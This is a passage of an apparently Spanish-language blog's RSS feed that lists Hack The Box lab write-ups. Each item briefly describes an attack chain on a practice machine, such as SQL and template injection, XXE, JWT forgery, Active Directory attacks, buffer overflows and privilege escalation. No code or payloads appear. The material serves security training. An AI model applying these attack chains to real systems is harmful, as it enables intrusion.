+0100</pubDate><guid>https://7rocky.github.io/htb/overgraph/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root</description></item><item><title>Late</title><link>https://7rocky.github.io/htb/late/</link><pubDate>Sat, 30 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/late/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una aplicación web en Flask que extrae texto de imágenes y lo renderiza, siendo vulnerable a SSTI. Luego, existe un PAM configurado para SSH con rutas relativas, que puede ser abusado debido a ciertos privilegios para sobrescribir ejecutables. Para comprometer esta máquina se necesitan conocimientos básicos de explotación web y de enumeración en Linux</description></item><item><title>Catch</title><link>https://7rocky.github.io/htb/catch/</link><pubDate>Sat, 23 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/catch/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina ofrece un archivo APK que contiene tokens de autenticación hard-coded de otros servicios expuestos. Uno de los tokens puede ser usado para enumerar una aplicación de Let&amp;rsquo;s Chat por medio de su API y obtener credenciales para Cachet. Este servicio es vulnerable a Server-Side Template Injection en PHP y podemos obtener más credenciales para acceder por SSH. La máquina ejecuta una tarea Cron para analizar archivos APK con un script en Bash que es vulnerable a inyección de comandos, por lo que tenemos que subir un archivo APK malicioso para explotarlo y convertirnos en root</description></item><item><title>Acute</title><link>https://7rocky.github.io/htb/acute/</link><pubDate>Sat, 16 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/acute/</guid><description>Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory</description></item><item><title>RouterSpace</title><link>https://7rocky.github.io/htb/routerspace/</link><pubDate>Sat, 09 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/routerspace/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un archivo APK con una app sencilla. Esta app realiza una petición web a una API que tiene que ser capturada con un proxy, y esta API es vulnerable a inyección de comandos. Después, el acceso a la máquina se puede realizar por SSH y una enumeración básica muestra que la versión de sudo es vulnerable</description></item><item><title>Undetected</title><link>https://7rocky.github.io/htb/undetected/</link><pubDate>Sat, 02 Jul 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/undetected/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una página web en PHP con una dependencia de terceros vulnerable a RCE. La máquina ha sido previamente comprometida y tiene algunas puertas traseras y exploits que tienen que ser detectadas y analizadas mediante técnicas de ingeniería inversa</description></item><item><title>Paper</title><link>https://7rocky.github.io/htb/paper/</link><pubDate>Sat, 18 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/paper/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web en WordPress con información secreta en borradores, y también un chat con un &lt;em>bot&lt;/em> que muestra información sensible. Después, el servidor es vulnerable a PolKit. Para comprometer esta máquina se necesitan conocimientos de enumeración en WordPress</description></item><item><title>Meta</title><link>https://7rocky.github.io/htb/meta/</link><pubDate>Sat, 11 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/meta/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una página web que analiza imágenes subidas con una versión vulnerable de exiftool que deriva en RCE. Luego, existe una tarea Cron que transforma imágenes con el comando mogrify de ImageMagick, que es vulnerable a inyección de comandos. Finalmente, tenemos permisos de sudo para ejecutar neofetch, lo cual posibilita la escalada de privilegios</description></item><item><title>Timing</title><link>https://7rocky.github.io/htb/timing/</link><pubDate>Sat, 04 Jun 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/timing/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una aplicación web en PHP que es vulnerable a enumeración de usuarios, LFI, Type Juggling y SQLi, aparte de otros errores y malas configuraciones. Después de leer el código PHP, se encuentra una manera de subir un archivo PHP para conseguir RCE. Luego encontramos una contraseña en un repositorio de Git y accedemos por SSH. Entonces, podemos ejecutar un archivo JAR con sudo que descarga archivos como root, y se puede usar un enlace simbólico para escribir una clave SSH como autorizada para root</description></item><item><title>Pandora</title><link>https://7rocky.github.io/htb/pandora/</link><pubDate>Sat, 21 May 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/pandora/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina expone información sensible por SNMP que permite acceder a la máquina. Luego, encontramos una instancia local de Pandora FMS que tiene varias vulnerabilidades y pueden ser explotadas para conseguir RCE como otro usuario. Este usuario puede ejecutar un binario SUID que es vulnerable a PATH hijacking, pero el ataque tiene que ser realizado desde una sesión de SSH. Para comprometer esta máquina se necesitan habilidades de enumeración y pentesting básicas</description></item><item><title>Unicode</title><link>https://7rocky.github.io/htb/unicode/</link><pubDate>Sat, 07 May 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/unicode/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS</description></item><item><title>Backdoor</title><link>https://7rocky.github.io/htb/backdoor/</link><pubDate>Sat, 23 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/backdoor/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web de WordPress que tiene un plugin vulnerable a navegación de directorios, que se puede utilizar para enumerar procesos en ejecución, y después un binario SUID. Para comprometer esta máquina es necesario tener conocimientos sobre WordPress y experiencia con vulnerabilidades de inclusión de archivos. En este write-up se utiliza un script de Python personalizado para leer archivos del servidor y un exploit público propio para ganar acceso a la máquina</description></item><item><title>Backend</title><link>https://7rocky.github.io/htb/backend/</link><pubDate>Tue, 12 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/backend/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene una API en la que podemos crear una cuenta después de un proceso de exploración. Luego encontramos documentación en formato Swagger donde podemos ver una ruta para ejecutar comandos y para leer archivos del servidor. Necesitamos encontrar la clave secreta usada para los tokens JWT y crear un token válido para ejecutar comandos. Para comprometer esta máquina se necesitan conocimientos sobre tokens JWT y enumeración de API</description></item><item><title>Overflow</title><link>https://7rocky.github.io/htb/overflow/</link><pubDate>Sat, 09 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/overflow/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Padding Oracle Attack y Bit Flipper Attack para iniciar sesión como admin y también vulnerable a SQLi por un CMS. Existe otro subdominio que usa una versión de exiftool que tiene una vulnerabilidad de RCE. Una vez en la máquina, los movimientos laterales son relativamente fáciles y la escalada de privilegios consiste en ingeniería inversa y explotación de una vulnerabilidad de Buffer Overflow en un binario SUID. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web, criptografía y explotación de binarios. En este write-up se utiliza un script en Python para efectuar un Bit Flipper Attack y un script en Ruby para SQLi</description></item><item><title>Shibboleth</title><link>https://7rocky.github.io/htb/shibboleth/</link><pubDate>Sat, 02 Apr 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/shibboleth/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene un servicio IPMI vulnerable donde podemos encontrar una contraseña que se reutiliza para un panel de control Zabbix. Aquí podemos entrar y ganar acceso a la máquina. Luego, encontramos una versión de MariaDB vulnerable a RCE como root. Para comprometer esta máquina se necesita una buena enumeración y metodología de pentesting</description></item><item><title>Altered</title><link>https://7rocky.github.io/htb/altered/</link><pubDate>Wed, 30 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/altered/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego podemos hacer fuerza bruta para sacar un PIN y cambiar la contraseña, evitando la limitación de peticiones, y explotar SQLi y Type Juggling. Después, se ve que el kernel de Linux es vulnerable a DirtyPipe. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web. En este write-up se utiliza un script en Ruby para encontrar el PIN válido</description></item><item><title>Secret</title><link>https://7rocky.github.io/htb/secret/</link><pubDate>Sat, 26 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/secret/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux</description></item><item><title>Stacked</title><link>https://7rocky.github.io/htb/stacked/</link><pubDate>Sat, 19 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/stacked/</guid><description>Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker</description></item><item><title>Ransom</title><link>https://7rocky.github.io/htb/ransom/</link><pubDate>Tue, 15 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/ransom/</guid><description>Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP cifrado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP</description></item><item><title>Devzat</title><link>https://7rocky.github.io/htb/devzat/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/devzat/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina contiene un servicio de chat sobre SSH y un subdominio web oculto vulnerable a inyección de comandos. Luego, podemos acceder a la máquina y explotar una versión vulnerable de InfluxDB para extraer la contraseña de otro usuario. Este usuario tiene permisos para ver un proyecto en desarrollo del chat de SSH que permite leer archivos arbitrarios del servidor. Para comprometer esta máquina se necesitan conocimientos básicos de explotación web y enumeración en Linux</description></item><item><title>Hancliffe</title><link>https://7rocky.github.io/htb/hancliffe/</link><pubDate>Sat, 05 Mar 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/hancliffe/</guid><description>Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator</description></item><item><title>Driver</title><link>https://7rocky.github.io/htb/driver/</link><pubDate>Sat, 26 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/driver/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina tiene una página web configurada con credenciales por defecto y una subida de archivos. Aquí podemos subir un archivo SCF para capturar el hash NTLMv2 del usuario y romperlo. Luego podemos explotar PrintNightmare. Para comprometer esta máquina se necesitan conocimientos básicos de explotación en Windows</description></item><item><title>GoodGames</title><link>https://7rocky.github.io/htb/goodgames/</link><pubDate>Mon, 21 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/goodgames/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de código SQL desde donde podemos obtener una contraseña para acceder a una verb interna que es vulnerable a SSTI. Luego, ganamos acceso a un contenedor de Docker que monta un directorio de la máquina, de manera que podemos aprovecharlo para escalar privilegios. Para comprometer esta máquina se necesitan habilidades básicas de pentesting web y de Docker. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero</description></item><item><title>Bolt</title><link>https://7rocky.github.io/htb/bolt/</link><pubDate>Sat, 19 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/bolt/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina tiene varios subdominios y una imagen de Docker con mucha información necesaria para explotar los servicios web. Existe una vulnerabilidad de SSTI en la comunicación entre dos servicios. Luego, podemos extraer una clave privada PGP de la caché de Google Chrome y descrifrar un mensaje. Para comprometer esta máquina, se necesitan conocimientos avanzados de Docker y habilidades básicas de explotación web</description></item><item><title>SteamCloud</title><link>https://7rocky.github.io/htb/steamcloud/</link><pubDate>Mon, 14 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/steamcloud/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene un cluster de Kubernetes que expone el kubelet y es vulnerable a RCE sin autenticación. Somos capaces de extraer credenciales de un Pod en ejecución y utilizarlas para crear un Pod malicioso que monta el sistema de archivos de la máquina anfitriona. Para comprometer esta máquina se necesitan conocimientos de pentesting en Kubernetes</description></item><item><title>Epsilon</title><link>https://7rocky.github.io/htb/epsilon/</link><pubDate>Mon, 07 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/epsilon/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina contiene una página web que expone un repositorio de Git con secretos en confirmaciones antiguas. Hay otra página web que necesita de un token JWT válido para explotar una vulnerabilidad de SSTI. El secreto de los tokens JWT está escrito en una función AWS Lambda. Luego, existe una tarea Cron que puede ser explotada mediante enlaces simbólicos para poder leer archivos arbitrarios. Para comprometer esta máquina, se necesitan conocimientos de Git, JWT, SSTI y AWS Lambda, ademñas de explotación de tareas Cron</description></item><item><title>Horizontall</title><link>https://7rocky.github.io/htb/horizontall/</link><pubDate>Sat, 05 Feb 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/horizontall/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE</description></item><item><title>Forge</title><link>https://7rocky.github.io/htb/forge/</link><pubDate>Sat, 22 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/forge/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina es vulnerable a Server-Side Request Forgery (SSRF) desde un subdominio hacia un servidor FTP. Después, existen permisos de sudo para ejecutar un script de Python con un depurador. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web. En este write-up se utiliza un script en Python personalizado para explotar el SSRF</description></item><item><title>NodeBlog</title><link>https://7rocky.github.io/htb/nodeblog/</link><pubDate>Mon, 10 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/nodeblog/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades</description></item><item><title>Previse</title><link>https://7rocky.github.io/htb/previse/</link><pubDate>Sat, 08 Jan 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/previse/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyección de comandos después de burlar redirecciones y conseguir registrar una nueva cuenta. Después, hay que romper un hash para acceder como usuario de bajos privilegios y realizar PATH hijacking mediante sudo. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web y Burp Suite, así como técnicas de escalada de privilegios comunes. En este write-up se utiliza un programa en Go personalizado para automatizar la intrusión</description></item><item><title>Static</title><link>https://7rocky.github.io/htb/static/</link><pubDate>Sat, 18 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/static/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String</description></item><item><title>Writer</title><link>https://7rocky.github.io/htb/writer/</link><pubDate>Sat, 11 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/writer/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión</description></item><item><title>Pikaboo</title><link>https://7rocky.github.io/htb/pikaboo/</link><pubDate>Sat, 04 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/pikaboo/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea Cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero</description></item><item><title>LogForge</title><link>https://7rocky.github.io/htb/logforge/</link><pubDate>Fri, 03 Dec 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/logforge/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina utiliza Log4j en un servidor Tomcat que es vulnerable a búsqueda JNDI. Luego hay un servidor FTP hecho en Java que también utiliza Log4j, pero esta vez solamente es vulnerable a exposición de información. Para comprometer esta máquina se necesitan conocimientos sobre Log4j, Tomcat, FTP y Wireshark</description></item><item><title>Intelligence</title><link>https://7rocky.github.io/htb/intelligence/</link><pubDate>Sat, 27 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/intelligence/</guid><description>Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web</description></item><item><title>Union</title><link>https://7rocky.github.io/htb/union/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/union/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina contiene vulnerabilidades de inyección de código SQL (SQLi) e inyección de comandos. Para comprometer la máquina se necesitan algunas técnicas de evasión de SQLi y análisis de código fuente. En este write-up se utiliza un programa en Java personalizado para automatizar un ataque de SQLi</description></item><item><title>BountyHunter</title><link>https://7rocky.github.io/htb/bountyhunter/</link><pubDate>Sat, 20 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/bountyhunter/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE</description></item><item><title>Seal</title><link>https://7rocky.github.io/htb/seal/</link><pubDate>Sat, 13 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/seal/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina contiene una página web de Tomcat montada sobre nginx, lo cual es una configuración vulnerable que desemboca en ejecución remota de comandos (RCE), y también tiene malas configuraciones de permisos en archivos y comandos con sudo. Para comprometer esta máquina se necesitan conocimientos sobre explotación de Tomcat y el sistema de archivos de Linux</description></item><item><title>Nunchucks</title><link>https://7rocky.github.io/htb/nunchucks/</link><pubDate>Tue, 02 Nov 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/nunchucks/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a Server-Side Template Injection (SSTI) y tiene algunas capabilities habilitadas pero protegidas. Para comprometer la máquina se necesitan conocimientos de plantillas en Node.js y ejecución de comandos en Perl</description></item><item><title>Explore</title><link>https://7rocky.github.io/htb/explore/</link><pubDate>Sat, 30 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/explore/</guid><description>Hack The Box. Android. Máquina fácil. Se trata de dispositivo móvil Android que contiene una aplicación vulnerable a lectura de archivos del dispositivo, a través de la cual se obtienen credenciales de acceso por SSH para poder escalar privilegios. Para comprometer el dispositivo, se necesitan conceptos de escaneo de puertos, reenvío de puertos y Android</description></item><item><title>Spider</title><link>https://7rocky.github.io/htb/spider/</link><pubDate>Sat, 23 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/spider/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE</description></item><item><title>dynstr</title><link>https://7rocky.github.io/htb/dynstr/</link><pubDate>Sat, 16 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/dynstr/</guid><description>Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard</description></item><item><title>Monitors</title><link>https://7rocky.github.io/htb/monitors/</link><pubDate>Sat, 09 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/monitors/</guid><description>Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de WordPress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura</description></item><item><title>Cap</title><link>https://7rocky.github.io/htb/cap/</link><pubDate>Sat, 02 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/cap/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene vulnerabilidades de referencias directas inseguras a archivos (IDOR) y capabilities a nivel de sistema. Para comprometer la máquina se necesita utilizar Wireshark para leer una captura de red y saber enumerar y explotar capabilities</description></item><item><title>Antique</title><link>https://7rocky.github.io/htb/antique/</link><pubDate>Mon, 27 Sep 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/antique/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina es una impresora HP JetDirect que expone la contraseña por SNMP y tiene una vulnerabilidad de lectura privilegiada de archivos. Para comprometer la máquina se necesitan técnicas de enumeración por SNMP y reenvío de puertos. En este write-up se utiliza un programa en Java personalizado para automatizar un ataque de SQLi</description></item><item><title>Knife</title><link>https://7rocky.github.io/htb/knife/</link><pubDate>Sat, 28 Aug 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/knife/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web en una versión de PHP con una puerta trasera y permisos de sudo configurados. Para comprometer la máquina se necesita conocer la versión de PHP y técnicas básicas de escalada de privilegios</description></item><item><title>Rope</title><link>https://7rocky.github.io/htb/rope/</link><pubDate>Sat, 23 May 2020 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/rope/</guid><description>Hack The Box. Linux. Máquina insana. Esta máquina expone un servidor web que es vulnerable a navegación de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Después de analizar el binario, descubrimos que tiene una vulnerabilidad de &lt;em>Format String&lt;/em> que puede ser explotada para conseguir RCE como &lt;code>john&lt;/code>. Este usuario puede ejecutar otro binario como el usuario &lt;code>r4j&lt;/code>. Este binario utiliza una librería externa que podemos modificar debido a los permisos que tiene y ganar acceso como &lt;code>r4j&lt;/code>. Finalmente, existe otro binario que ejecuta un servidor de &lt;em>socket&lt;/em> en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de &lt;em>Buffer Overflow&lt;/em>. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como &lt;code>root&lt;/code></description></item><item><title>Forest</title><link>https://7rocky.github.io/htb/forest/</link><pubDate>Sat, 21 Mar 2020 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/forest/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de MS RPC, AS-REP Roasting, descrifrado de contraseñas, DCSync y Pass the Hash. Para comprometer la máquina se necesitan conocer técnicas básicas de enumeración y explotación de AD, además de usar BloodHound</description></item><item><title>Netmon</title><link>https://7rocky.github.io/htb/netmon/</link><pubDate>Sat, 29 Jun 2019 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/netmon/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina presenta una instancia de PRTG Network Monitor que es vulnerable a RCE como system. Nos podemos conectar a FTP con credentiales anonymous y leer una copia de seguridad de un archivo de configuración de PRTG Network Monitor y obtener una contraseña antigua, que proporciona el formato para adivinar la contraseña actual. Luego, podemos ejecutar el exploit público para conseguir RCE y convertirnos en Administrator</description></item><item><title>Frolic</title><link>https://7rocky.github.io/htb/frolic/</link><pubDate>Sat, 23 Mar 2019 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/frolic/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que almacena algunos archivos con varias codificaciones y lenguajes esotéricos. Finalmente, podemos llegar a una instancia de PlaySMS que es vulnerable a RCE mediante PHP. La máquina contiene un binario SUID que es vulnerable a Buffer Overflow y permite la escalada de privilegios</description></item><item><title>Active</title><link>https://7rocky.github.io/htb/active/</link><pubDate>Sat, 08 Dec 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/active/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de SMB, descrifrado de contraseñas y Kerberoasting. Para comprometer la máquina se necesitan conocer técnicas básicas de enumeración y explotación de AD</description></item><item><title>Jerry</title><link>https://7rocky.github.io/htb/jerry/</link><pubDate>Sat, 17 Nov 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/jerry/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina expone una instalación por defecto de Tomcat. Podemos entrar al gestor de aplicaciones con las credentiales por defecto y conseguir ejecución remota de comandos en la máquina como Administrator</description></item><item><title>Mirai</title><link>https://7rocky.github.io/htb/mirai/</link><pubDate>Sat, 10 Feb 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/mirai/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina es un dispositivo Raspberry Pi que tiene configuradas las credenciales por defecto, por lo que podemos acceder por SSH y 